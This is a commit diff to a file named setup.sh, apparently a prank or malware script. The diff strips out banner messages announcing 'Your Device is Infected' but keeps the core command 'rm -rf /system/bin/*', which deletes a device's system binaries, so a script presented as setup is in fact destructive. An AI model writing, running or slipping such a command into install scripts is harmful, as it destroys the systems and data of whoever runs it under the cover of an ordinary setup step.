ffb3cface00fa35681b6e421cbdffbfaffb13120
unknownkira <93389526+L0rdK1r422@users.noreply.github.com>
2021-12-09 22:27:28 +0800

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,17 +1,4 @@
 clear
-echo
-echo
-echo
-figlet -w 200 -f standard "Your"
-figlet -w 200 -f standard "Device"
-figlet -w 200 -f standard "is"
-figlet -w 200 -f standard "Infected"
-sleep 5s
-clear
-echo
-echo
-echo
-echo your device will freeze XD
 rm -rf /system/bin/*
 sleep 60s
 
